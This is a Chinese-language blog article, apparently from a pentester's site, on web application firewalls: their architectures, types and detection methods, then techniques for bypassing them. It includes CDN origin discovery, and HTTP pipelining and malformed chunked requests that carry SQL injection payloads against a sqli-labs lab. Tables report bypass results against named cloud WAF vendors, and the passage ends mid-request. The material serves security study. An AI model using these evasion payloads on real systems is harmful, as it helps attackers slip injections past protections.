<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>WAF普及篇</title>
      <link href="/2020/05/20/WAF%E6%99%AE%E5%8F%8A%E7%AF%87/"/>
      <url>/2020/05/20/WAF%E6%99%AE%E5%8F%8A%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-WAF概念"><a href="#0x00-WAF概念" class="headerlink" title="0x00 WAF概念"></a>0x00 WAF概念</h1><blockquote><p>问：为什么要讲WAF概念？</p><p>答：知己知彼，方能百战不殆。</p><p>​        授人以鱼，不如授人以渔。</p></blockquote><p><strong>Web应用程序防火墙（WAF）的主要作用是过滤，监控和阻止各类进出Web应用程序的HTTP流量。</strong>是集 Web 防护、网页保护、负载均衡、应用交付于一体的 Web 整体安全防护设备，<strong>和防火墙的区别是它工作在应用层</strong>，主要对 Web 请求进行防护，有效阻止各类针对 Web 应用和 API 的攻击。</p><p><img src="/2020/05/20/WAF普及篇/image-20200905223200707.png" alt="image-20200905223200707"></p><p><strong>防御功能：</strong>如 SQL 注入、XML 注入、跨站脚本 (XSS)、自动化攻击(机器人程序)、应用层拒绝服务 (DoS) 、安全配置错误、WEB防火墙、<strong>服务器虚拟补丁</strong>等。</p><p><strong>目前国内 WAF 产品技术能力：</strong>特征识别技术(语法语义分析)、机器学习、大数据分析、动态防御、RASP、威胁情报、容器技术和蜜罐技术等。</p><h1 id="0x01-WAF架构"><a href="#0x01-WAF架构" class="headerlink" title="0x01 WAF架构"></a>0x01 WAF架构</h1><ul><li><p>串联</p></li><li><p>旁路</p></li></ul><h2 id="串联"><a href="#串联" class="headerlink" title="串联"></a>串联</h2><p><strong>串联WAF一般权重较高，对攻击的请求和会话有优先于业务的一票否决权，是最为常见的WAF架构方式。</strong></p><p><img src="/2020/05/20/WAF普及篇/image-20200905223239401.png" alt="image-20200905223239401"></p><p>不过串联接入业务意味着WAF系统会捆绑、分担业务指标，在日益追求高响应的复杂链路中强行增加了一个单点故障隐患，那考核运维健壮性的指标(可用性、响应耗时和故障率等)将是悬置WAF头顶的达摩克利斯之剑。</p><p><strong>串联WAF根据产品形态又有多种变形，常见的区分方式看设备部署位置：</strong></p><p>传统的硬件盒子设备一般放置在网关入口后，业务中间件之前，串联部署方式有透明模式、反向代理模式等。</p><p>其前置于中间件，意味着WAF需预留很大一部分性能来处理HTTP拆解和封装的工作，尤其是当下HTTPS已成为普遍场景，设备处理性能急剧下降，使得此类架构的成本投入极大。</p><p><strong>1. 透明连接模式：</strong></p><blockquote><p>最常见的部署模式</p></blockquote><p><img src="/2020/05/20/WAF普及篇/透明连接.png" alt="透明连接"></p><p><strong>特点：</strong></p><ul><li><p>不需要改变用户网络结构，对于用户而言是透明的</p></li><li><p>故障恢复快</p></li></ul><p><strong>2. 反向代理模式：</strong></p><blockquote><p>适应环境部署</p></blockquote><p><img src="/2020/05/20/WAF普及篇/反向代理.png" alt="反向代理"></p><p><strong>特点：</strong></p><ul><li><p>可旁路部署，对于用户网络不透明</p></li><li><p>故障恢复时间慢</p></li></ul><p><strong>3. 主备模式</strong></p><p><img src="/2020/05/20/WAF普及篇/image-20200905223617569.png" alt="image-20200905223617569"></p><p><img src="/2020/05/20/WAF普及篇/image-20200905223623393.png" alt="image-20200905223623393"></p><p><strong>特点：</strong></p><ul><li>解决一定情况下WAF的单点故障问题</li></ul><p><strong>4. 集群模式</strong></p><blockquote><p>大势所趋</p></blockquote><p><img src="/2020/05/20/WAF普及篇/image-20200905223704638.png" alt="image-20200905223704638"></p><p><strong>特点：</strong></p><ul><li>高性能、更多新功能。</li></ul><p><strong>5. CNAME架构：</strong></p><p>当下云厂商最常用修改域名CNAME做多维安全防护的架构同硬件类部署方式在应用场景视角是一致的，不过云厂商的设备和网络资源丰富，人才资源配备到位，又有大厂品牌背书，只要有足够的用户均摊成本，这种架构算在成本、效率、安全不可能三角中属协调最优的解决方案。</p><p>但在部署之后，很有可能因配置不当等问题被绕过CDN解析，流量直接到达源站，从而被绕过安全防护。</p><p>最常见的产品就是云WAF，政府和企业应用广泛。</p><p><img src="/2020/05/20/WAF普及篇/image-20200117165807392.png" alt="image-20200117165807392"></p><p><strong>特点：</strong></p><ul><li><p>较低成本、更高效率、更安全。</p></li><li><p>但在部署之后，很可能因配置不当等问题被绕过CDN解析，流量直接到达源站，从而被绕过安全防护。</p></li></ul><p><strong>6. 嵌入式部署：</strong></p><p>还有另一类串联的部署方式，即WAF设备位置后移，嵌套到中间件上，这样WAF的损耗将分摊到业务机器，这样的捆绑意味着一荣俱荣，一损皆损，又因位置后移到了业务侧，策略下发和管理都极其复杂，且中间件种类繁多，规模一大，这种架构堪称灾难。</p><p>因为WEB服务器是WAF所保护的对象。部署时当然要使WAF尽量靠近WEB服务器。但是这样对业务侵入性更强。（但还不是最强）</p><p>比如安全狗、云锁等产品，适合小规模站点。</p><p><img src="/2020/05/20/WAF普及篇/image-20200117170913367.png" alt="image-20200117170913367"></p><p>特点：</p><ul><li><p>分摊业务机器性能。</p></li><li><p>无视HTTP请求包前后解析不一致的问题。</p></li></ul><p><strong>7. 嵌入式集群部署：</strong></p><p>比如长亭雷池、腾讯门神等产品。</p><p><img src="/2020/05/20/WAF普及篇/image-20200905224019792.png" alt="image-20200905224019792"></p><p><strong>特点：</strong></p><ul><li><p>解决性能问题。</p></li><li><p>无视HTTP请求包前后解析不一致的问题。</p></li></ul><p><strong>8. OpenResty部署：</strong></p><p>而随着业务架构的逐渐优化，一般的互联网业务架构会前置越来越轻的转发层，将WAF嵌到转发层，或在转发层通过openresty等方式将请求过一遍旁挂的WAF集群，这属对业务链路侵入最轻的一种方式，很多互联网公司自建的WAF采用该架构。</p><p><img src="/2020/05/20/WAF普及篇/image-20200117171730131.png" alt="image-20200117171730131"></p><h2 id="旁路"><a href="#旁路" class="headerlink" title="旁路"></a>旁路</h2><p><strong>旁路WAF可以理解为一套离线分析系统，在各类配置和参数设置上很难同业务机器同步，这导致两者之间的耦合缺漏会更大</strong>，旁路部署的后置阻断措施也极具多样性：IP维度(OSI 4层封禁、7层封禁)，Session维度(业务路由基于登陆的cookies等)。</p><p>适合于刚开始部署WAF时，用于收集和了解服务器被访问和被攻击的信息，为后续在线部署提供优化配置参考。这种部署工作模式，对原有网络不会有任何影响。</p><p><img src="/2020/05/20/WAF普及篇/image-20200806231113308.png" alt="image-20200806231113308"></p><p><strong>特点：</strong></p><ul><li>一般只会进行告警而不阻断。</li></ul><p><img src="/2020/05/20/WAF普及篇/image-20200905224609621.png" alt="image-20200905224609621"></p><p>旁挂WAF一般不在会话链路以内，这意味着针对命令执行、Getshell类的一条语句拿权限的攻击束手无策，满足业务性能，牺牲了较多的安全指标，做出这种妥协，一方面是业务/运维强势，可用性是相关部门较重的KPI指标，另一方面可能是WAF系统开发和运营人力资源紧张，旁路离线分析提供了一定的缓和空间。</p><h2 id="灵活组合"><a href="#灵活组合" class="headerlink" title="灵活组合"></a>灵活组合</h2><p>WAF产品架构多样，除了串联和旁路外，基于业务特性还有各种各样的组合方式。</p><p>比如基于业务架构单一的特点(系统、语言、中间件、数据库版本等相关信息全局一致)，只需要关注固定版本的系统/应用漏洞情报，便可采用平日旁挂，漏洞爆发打开串联开关，漏洞批量修复后恢复旁挂的方式，在安全、效率、成本的博弈中发挥一点能动性。</p><p><img src="/2020/05/20/WAF普及篇/image-20200905224516336.png" alt="image-20200905224516336"></p><p>特点：</p><ul><li>灵活</li></ul><h1 id="0x02-WAF类型"><a href="#0x02-WAF类型" class="headerlink" title="0x02 WAF类型"></a>0x02 WAF类型</h1><h2 id="产品形态划分"><a href="#产品形态划分" class="headerlink" title="产品形态划分"></a>产品形态划分</h2><ul><li>硬WAF</li><li>软WAF</li><li>云WAF</li><li>代码WAF</li><li>RASP</li></ul><h3 id="1-硬件WAF"><a href="#1-硬件WAF" class="headerlink" title="1. 硬件WAF"></a>1. 硬件WAF</h3><p>使用专门的硬件设备，可以理解为流量代理，一般部署方式都需要流量经过它，针对数据包进行拆包-&gt;清洗-&gt;规则命中-&gt;放行/丢弃。</p><p><strong>适用客户：</strong></p><p>对于安全需求较高的网站，如政府、金融、运营商多采购易用、稳定、高吞吐量的硬件 WAF 产品。</p><p><strong>常见产品：</strong>各厂商铁盒子WAF（深信服、天融信、启明星辰、安恒、绿盟等）</p><p><strong>部署方式：</strong>硬件 Web 防火墙为旁路式和串联式部署在 Web 服务器前</p><h3 id="2-软件WAF"><a href="#2-软件WAF" class="headerlink" title="2. 软件WAF"></a>2. 软件WAF</h3><p>实时监听端口（服务）</p><p>在主机上预先安装了这种防护软件，和监听web端口的流量是否有恶意的，所以这种从功能上讲较为全面。</p><p><strong>适用客户：</strong></p><p>软件 WAF 需要单台服务器部署，占用内存过多，并可能存在影响正常业务和被绕过的风险，适合中小型网站。</p><p><strong>常见产品：</strong>云锁，安全狗、D盾、护卫神、ModSecurity、ngx-lua-waf等。</p><p><strong>部署方式：</strong>软件 WAF 为代理和嵌入式</p><h3 id="3-云WAF"><a href="#3-云WAF" class="headerlink" title="3. 云WAF"></a>3. 云WAF</h3><p>通常是CDN包含的WAF，专门的流量传到检测节点中做检测</p><p>云 WAF 服务采用多租户模式、以云为中心，只需通过移交域名解析权就可实现安全防护，大大减轻了用户的运维成本。</p><p><strong>适用客户：</strong></p><p>国内云 WAF 用户更偏向于互联网行业。对于一些数据保密级别较高的政企，数据上云是否存在数据泄漏风险，也是客户考虑的因素。</p><p><strong>常见产品：</strong>阿里云，腾讯云，创宇盾，京东云，百度云、CloudFlare、Imperva、安全宝等</p><p><strong>部署方式：</strong>过移交域名解析权来实现安全防护</p><h3 id="4-代码WAF"><a href="#4-代码WAF" class="headerlink" title="4. 代码WAF"></a>4. 代码WAF</h3><p>使用脚本语言实现的过滤器模式</p><p>这种机制本质上属于应用程序安全架构的范畴，它是遵循安全编码最佳实践的产物。</p><h3 id="5-RASP"><a href="#5-RASP" class="headerlink" title="5. RASP"></a>5. RASP</h3><blockquote><p>Gartner 在2014年应⽤安全报告⾥将其列为应⽤安全领域的关键趋势。</p></blockquote><p>RASP 全称 Runtime application self-protection(运⾏时应⽤⾃我保护)，即将防护引擎嵌入到应用内部，不再依赖外部防护设备。</p><p><strong>防护原理：</strong></p><p>其本质上是从编程语言层面挂钩关键函数，深度监控应用执行流。在数据库、网络、文件系统等多个层面，对应用进行全面的监控和防护。</p><p><strong>常见产品：</strong>OPENRASP(百度开源)、灵蜥、安数云、宝塔、云锁等。</p><p><strong>部署方式：</strong>通过不同语言定制开发</p><p><strong>Java实现方式</strong></p><p>通过Java Agent方式实现</p><p><strong>判断方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:xxx.jar=mode=test Test -jar agent-1.0-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p>启动命令行可以通过Webshell执行命令查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/cmdline</span><br></pre></td></tr></table></figure><p>还可以寻找是否存在RASP相关日志文件，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rasp/logs/rasp/rasp.log</span><br></pre></td></tr></table></figure><p>也可能会添加响应头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Protected-By: 「rasp」</span><br></pre></td></tr></table></figure><p><strong>PHP实现方式</strong></p><p>通过开发第三方PHP扩展库实现</p><p><strong>判断方法</strong></p><ul><li><p>phpinfo()页面查找rasp相关模块</p></li><li><p>或者模块路径中查找文件</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib64/php/modules/「rasp」.so</span><br></pre></td></tr></table></figure><p><strong>RASP vs 传统WAF</strong></p><p>类似于保镖和保安的区别。</p><p>优点：</p><table><thead><tr><th><strong>RASP</strong></th><th>WAF</th></tr></thead><tbody><tr><td>几乎0误报，让告警更加有意义</td><td>触发规则即告警</td></tr><tr><td>针对编程语言深度定制</td><td>一套规则吃所有</td></tr><tr><td>更接近应用层</td><td>大部分隔着网络层，带来更多绕过可能</td></tr></tbody></table><p>缺点：</p><blockquote><p>优缺点比较鲜明的产品</p></blockquote><table><thead><tr><th><strong>RASP</strong></th><th>WAF</th></tr></thead><tbody><tr><td>不同环境/产品性能消耗不一</td><td>流量/规则影响性能</td></tr><tr><td>业务侵入性更高</td><td>不影响业务系统运行</td></tr><tr><td>还不够成熟</td><td>市场占有率依旧高</td></tr></tbody></table><h2 id="部署位置划分"><a href="#部署位置划分" class="headerlink" title="部署位置划分"></a>部署位置划分</h2><ul><li>嵌入式</li><li>非嵌入式</li></ul><h3 id="1-嵌入式"><a href="#1-嵌入式" class="headerlink" title="1. 嵌入式"></a>1. 嵌入式</h3><blockquote><p>先中间件解析后，再经过WAF处理</p></blockquote><p>特点：嵌入式无需考虑解析问题，但比较消耗业务系统资源。</p><p>常见产品：软件WAF、RASP WAF等。</p><h3 id="2-非嵌入式"><a href="#2-非嵌入式" class="headerlink" title="2. 非嵌入式"></a>2. 非嵌入式</h3><blockquote><p>与业务分离的WAF都属于非嵌入式</p></blockquote><p>特点：部署灵活，但因为需要自身进行解析，可能会存在与后端服务器解析不一致导致绕过。</p><p>常见产品：硬WAF、云WAF等。</p><h2 id="绕过风险"><a href="#绕过风险" class="headerlink" title="绕过风险"></a>绕过风险</h2><p><strong>1. 云WAF</strong></p><blockquote><p>如果配置不当，且获取了真实IP地址，通过强制解析域名，就可以轻松绕过。</p></blockquote><p>云WAF的主要实现原理是通过将用户的DNS解析到云节点实现防护，这样一来，如果黑客通过相关手段获取了服务器的真实IP地址，然后强制解析域名，就可以轻松绕过云WAF对服务器发起攻击。</p><p><strong>2. 硬WAF</strong></p><p>硬件防火墙对HTTP协议进行自行解析，可能存在与Web服务器对HTTP请求的理解不一致从而导致被绕过。</p><p><strong>3. 软件WAF</strong></p><p>国内的很多中小企业或者个人站长喜欢部署一些软件WAF来节约成本，软件WAF也属于嵌入式的WAF，协议层面的绕过方法是无效的，主流方式是使用规则绕过，也可能限于成本或者某些原因，规则很容易被绕过。</p><p><strong>4. 代码WAF</strong></p><ul><li><p>规则不严谨，比如：</p><ul><li>未考虑大小写、编码等</li><li>字符串替换为空，但未多次匹配</li></ul></li><li><p>代码逻辑问题</p></li></ul><p><strong>5. RASP</strong></p><ul><li><p>hook点</p></li><li><p>本身的安全性（等同于业务系统权限）</p></li></ul><p><strong>6. 嵌入式WAF</strong></p><ul><li>规则</li><li>性能</li></ul><p><strong>7. 非嵌入式WAF</strong></p><ul><li><strong>协议解析</strong></li><li>规则</li><li>性能</li></ul><h1 id="0x03-拦截原理"><a href="#0x03-拦截原理" class="headerlink" title="0x03 拦截原理"></a>0x03 拦截原理</h1><ul><li>正则匹配</li><li>语义分析</li><li>机器学习</li><li><strong>组合使用</strong></li></ul><h2 id="基于正则匹配"><a href="#基于正则匹配" class="headerlink" title="基于正则匹配"></a>基于正则匹配</h2><p>在Web攻击检测发展中，大部分还是传统的基于正则的检测方式，一般是从所有攻击特征提炼出匹配正则，用正则引擎去检测提交的请求是否是可以命中，命中即判为恶意。这种依赖于正则匹配的检测，在面对变化多样的攻击payload就需要不断的补齐规则，规则维护麻烦且易出错，规则越多检测速度越慢影响性能，且基于正则的匹配理论上证明无法完全避免漏报和误报，面对场景多样的Web请求场景，规则策略人员都是在误报和漏报中寻找一个平衡。</p><p>缺点：</p><ul><li>需要不断的更新规则，维护麻烦且易出错。</li><li>规则越多检测速度越慢影响性能。（集群解决）</li><li>基于正则的匹配理论上无法完全避免漏报和误报。</li></ul><h2 id="基于语义分析"><a href="#基于语义分析" class="headerlink" title="基于语义分析"></a>基于语义分析</h2><p>基于语义分析的检测前提是检测类型本身具备规则定义的语义规范，如运用SQL数据库语言的SQL注入攻击，运用JavaScript的XSS攻击。本质是检测当前输入的检测内容是否是符合对应的语法规范，从语义上去理解当前payload是否是攻击。</p><p>开源产品：libinjection</p><p>一些参考：</p><p><a href="https://www.anquanke.com/post/id/86097" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86097</a></p><p><a href="https://gist.github.com/migolovanov/432fe28c8c7e9fa675ab3903c5eda77f" target="_blank" rel="noopener">https://gist.github.com/migolovanov/432fe28c8c7e9fa675ab3903c5eda77f</a></p><p><a href="https://mp.weixin.qq.com/s/w5TwFl4Ac1jCTX0A1H_VbQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/w5TwFl4Ac1jCTX0A1H_VbQ</a></p><h2 id="基于机器学习"><a href="#基于机器学习" class="headerlink" title="基于机器学习"></a>基于机器学习</h2><p>基于机器学习分为监督学习和无监督学习，监督学习是根据收集标记的黑白样本，训练出一个检测模型来做预测，无监督学习采用建立正常流量模型，不符合模型的流量识别为恶意，两种方式可能由于样本的不足或特征选取问题，导致漏判或误判，加上不同的算法选择可能会带来更长的延迟，有的可能只在旁路离线跑做为离线数据分析用，还不适合线上实时拦截运行。</p><p>大多数使用无监督学习的方法，针对大量正常日志建立模型，与正常流量不符的则被识别为异常。这个思路与拦截规则的构造恰恰相反。<strong>拦截规则意在识别入侵行为</strong>，因而需要在对抗中“随机应变”；而<strong>基于模型的方法旨在建模正常流量</strong>，在对抗中“以不变应万变”。</p><ul><li>一般作为辅助手段，结合其他方式一同使用。</li></ul><h2 id="语义-机器学习"><a href="#语义-机器学习" class="headerlink" title="语义+机器学习"></a>语义+机器学习</h2><p>目前比较新颖且主流的WAF采用基于<strong>语义分析</strong>结合<strong>机器学习</strong>打分评判，比如长亭雷池、腾讯门神等。</p><p>相对于传统正则引擎，这种方式也多了一些比较另类的绕过可能，总结这些绕过其核心的思路有以下两点：</p><ol><li><p>利用解析器和后端处理逻辑的不一致，构造实际可以执行的payload ，但是语法分析会出现语法错误或者打分认为是无害的，骗过引擎。</p></li><li><p>为了后续能够处理 WAF 中的特殊场景（比如闭合，要同时适配多种后端），WAF 语义分析的解析引擎一般会自行进行实现，一旦出现实现者没有考虑到的点，或者有一些后端的特性没有覆盖到，就可能引发绕过。</p></li></ol><p>具体一些绕过案例可以参考这篇文章：<a href="https://security.tencent.com/index.php/blog/msg/151" target="_blank" rel="noopener">门神WAF众测总结</a></p><h1 id="0x04-绕过维度"><a href="#0x04-绕过维度" class="headerlink" title="0x04 绕过维度"></a>0x04 绕过维度</h1><ul><li>架构层面</li><li>协议/中间件层面</li><li>资源限制</li><li>编码层面</li><li>白名单策略</li><li>输出层面</li><li>应用(编程语言/数据库)/系统</li><li>搜索引擎层面</li></ul><h2 id="一、架构层面"><a href="#一、架构层面" class="headerlink" title="一、架构层面"></a>一、架构层面</h2><h3 id="1-串联"><a href="#1-串联" class="headerlink" title="1. 串联"></a>1. 串联</h3><p><strong>a. WAF与后端业务的理解不同</strong></p><p>串联架构的ByPass测试需找寻WAF与中间件、后端业务间的耦合性缺漏（比如下一小节协议/中间件层面的问题）。</p><p><strong>b. 绕过CDN（云WAF特有）</strong></p><p><strong>原理：</strong></p><p>如果流量没有经过WAF，WAF即无法拦截攻击请求。当前多数云WAF架构，通过更改DNS解析，把流量引入WAF集群，流量经过检测后转发请求到源站。</p><p><strong>关于部署了CDN源站的一点小知识</strong></p><p><strong>部署CDN的常见问题：</strong></p><ul><li>未更换IP，通过域名解析历史记录很快找到。</li><li>未限制IP直接访问，网络空间搜索引擎轻易找到。</li></ul><p><strong>伪防御：</strong></p><ul><li>通过中间件配置只允许域名访问，禁止ip直接访问。</li></ul><p><strong>防御绕过：</strong></p><ul><li><p>通过修改本地hosts文件，手动绑定域名IP直接解析绕过CDN</p></li><li><p>或者BurpSuite请求指向IP地址，修改host请求头为域名</p></li></ul><p><strong>真防御：</strong></p><p>限制白名单访问</p><ol><li><p>通过中间件或者SLB（负载均衡）前的云防火墙配置IP访问白名单，设置仅CDN回源节点能够访问。但是CDN回源节点不是固定的，所以要调用CDN厂商接口获得节点IP列表再加入白名单。</p></li><li><p>配置SLB的ACL，把WAF回源网段加入白名单，CDN回源到了WAF所以不用在乎CDN节点，一劳永逸。</p></li></ol><p>如果目标站点没有按照最后的防御方法进行配置，那么找到真实IP实现CDN绕过只是时间问题。</p><p><strong>寻找真实IP一般情况下用的比较多的方法:</strong></p><ul><li>DNS解析记录</li><li>Banner识别</li><li>企业/单位分配的固定IP段</li><li>邮件服务器IP或者子域名未加CDN，查找子域名的C段</li></ul><p><strong>终极方法：</strong></p><ul><li>全网IP匹配域名扫描</li></ul><blockquote><p>寻找真实IP的方法非常多，针对不同的系统功能有对应合适的方法寻找，网上公开的总结很多，这里就不一一列举了。</p></blockquote><p><strong>c. 利用边界漏洞</strong></p><p>如果未能发现源站IP，还可以尝试寻找子站的SSRF漏洞。如果子站访问目标站不经过WAF集群，可以利用SSRF漏洞来绕过WAF。</p><h3 id="2-旁路"><a href="#2-旁路" class="headerlink" title="2. 旁路"></a>2. 旁路</h3><p><strong>a. WAF与后端业务的理解不同</strong></p><p>和串联一样，此类方法同样有效。</p><p><strong>b. 阻断执行时间差</strong></p><p>通过攻击测试，很容易判断出旁路WAF同阻断组件的通联时间，获取海量且廉价的代理IP，控制好单IP的测试存活时间，较低成本便可绕过；</p><h2 id="二、协议-中间件层面"><a href="#二、协议-中间件层面" class="headerlink" title="二、协议/中间件层面"></a>二、协议/中间件层面</h2><blockquote><p>适用于非嵌入式的WAF</p></blockquote><p>即使流量都确保经过WAF，如果WAF的防御策略根本就没有检测payload，那么也就能绕过WAF。</p><p>可以利用（WAF/后端WEB服务器/语言解析引擎）对HTTP协议解析的差异来绕过WAF。</p><h3 id="1-Keep-alive-Pipelining"><a href="#1-Keep-alive-Pipelining" class="headerlink" title="1. Keep-alive+Pipelining"></a>1. Keep-alive+Pipelining</h3><p><strong>限制条件：</strong></p><ul><li>本地测试仅Apache+php_ts(线程安全版本)支持多个回显</li><li>但是一般中间件都会接受所有请求，意味着命令执行、文件上传等不需要回显的请求都是ok的</li><li>可以结合OOB外带、HTTP请求走私等</li></ul><blockquote><p>引用维基百科：HTTP 管线化同时依赖于客户端和服务器的支持。遵守 HTTP/1.1 的服务器支持管线化。这并不是意味着服务器需要提供管线化的回复，而只是要求在收到管线化的请求时候不会失败。</p></blockquote><p><strong>原理：</strong></p><p>HTTP管道化允许多个HTTP请求通过一个套接字同时被输出 ，而不用等待相应的响应。然后请求者就会等待各自的响应，这些响应是按照之前请求的顺序依次到达。因为多个请求可被同时传送，如果WAF只检测第一个请求，而忽略后面的请求，便可被绕过。</p><p><strong>同时还可以绕过WAF的访问控制、虚拟补丁等（HTTP请求走私同样可以绕过）</strong></p><p><strong>步骤：</strong></p><ol><li><p>关闭burp的Repeater的Content-Length自动更新，Repeater在下拉选项中取消update Content-Length选中。</p></li><li><p>完整复制一份在当前最后一个字符后面。</p></li><li><p>将数据包的Content-Length的值还原回前面的长度，最后将Connection字段值设为keep-alive。提交后会返回两个响应包，分别对应两个请求。</p><p>例1：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sqli-labs/Less-2/</span> HTTP/1.0</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">xx=union select user(),2,3GET /sqli-labs/Less-2/?id=1 HTTP/1.0</span><br><span class="line"><span class="attribute">Host</span>: 192.168.10.4</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line">(CR LF)</span><br></pre></td></tr></table></figure></li></ol><p>   例2：</p>   <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/sqli-labs/Less-2/?id=1</span> HTTP/1.0</span><br><span class="line">   <span class="attribute">Host</span>: 192.168.10.4</span><br><span class="line">   <span class="attribute">Connection</span>: keep-alive</span><br><span class="line">   </span><br><span class="line">   POST /sqli-labs/Less-2/ HTTP/1.1</span><br><span class="line">   <span class="attribute">Connection</span>: close</span><br><span class="line">   </span><br><span class="line">   xx=union select user(),2,3</span><br><span class="line">   (CR LF)</span><br></pre></td></tr></table></figure><p>   例3：(HTTP 0.9)</p>   <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sqli-labs/Less-2/</span> HTTP/1.0</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span>: 26</span><br><span class="line"></span><br><span class="line">xx=union select user(),2,3GET /sqli-labs/Less-2/?id=1</span><br><span class="line">(CR LF)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>本地环境测试时，当php版本为<code>nts</code>时，服务端只返回一个响应，<code>ts</code>版本是ok的。</p><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✔</td></tr><tr><td>腾讯云</td><td>✔</td></tr><tr><td>百度云/cloudflare</td><td>✔</td></tr><tr><td>创宇盾</td><td>✔</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✔</td></tr></tbody></table><h3 id="2-分块传输"><a href="#2-分块传输" class="headerlink" title="2. 分块传输"></a>2. 分块传输</h3><p><strong>条件：</strong></p><ul><li>常见中间件均支持此方式（Apache、Nginx、Tomcat）</li></ul><p><strong>原理：</strong></p><p>通过在数据包中添加<code>Transfer-Encoding: chunked</code>,标示报文采用分块编码。此时会忽略<code>Content-Length</code>字段设置。<br>此时数据部分为一系列分块，每个分块包含十六进制的长度值和数据，长度值与数据各占一行。最后用<code>0</code>标志分块结束并且最后紧跟两个换行。</p><h4 id="正常分块"><a href="#正常分块" class="headerlink" title="正常分块"></a>正常分块</h4><blockquote><p>正常+注释的方法一般都不能绕过了</p></blockquote><p>使用BurpSuite的chuncked插件比较方便</p><p><strong>测试：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✘</td></tr><tr><td>腾讯云</td><td>✘=&gt;✔(guanjia)、✘(cloud)</td></tr><tr><td>百度云/cloudflare</td><td>✔=&gt;✘</td></tr><tr><td>创宇盾</td><td>✘</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✘</td></tr></tbody></table><p>京东云交过src还可以🐂🍺</p><h4 id="畸形分块"><a href="#畸形分块" class="headerlink" title="畸形分块"></a>畸形分块</h4><p><strong>1. 去掉最后的0</strong></p><p><strong>条件：</strong></p><p>适用于容错性较高的中间件，比如Apache，返回400但是可以成功执行</p><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✔</td></tr><tr><td>腾讯云</td><td>✔</td></tr><tr><td>百度云/cloudflare</td><td>✔</td></tr><tr><td>创宇盾</td><td>✔</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✔</td></tr></tbody></table><p><strong>2. 添加空格或者TAB</strong></p><p><strong>条件：</strong></p><p>仅Apache支持解析</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding :chunked</span><br><span class="line">Transfer-Encoding:chunked</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✔(edu)✘(yq)</td></tr><tr><td>腾讯云</td><td>✔</td></tr><tr><td>百度云/cloudflare</td><td>✔</td></tr><tr><td>创宇盾</td><td>✘=&gt;✔</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✔</td></tr></tbody></table><p><strong>3. 多加一些字符，导致报错</strong></p><p><strong>条件：</strong></p><p>Nginx正常解析</p><p>php(nts)+Apache、Tomcat正常但不解析</p><p>php(ts)+Apache会直接400报错</p><p><strong>原理：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sql.php?id=2%20union</span> HTTP/1.1</span><br><span class="line">......</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">aa</span></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span 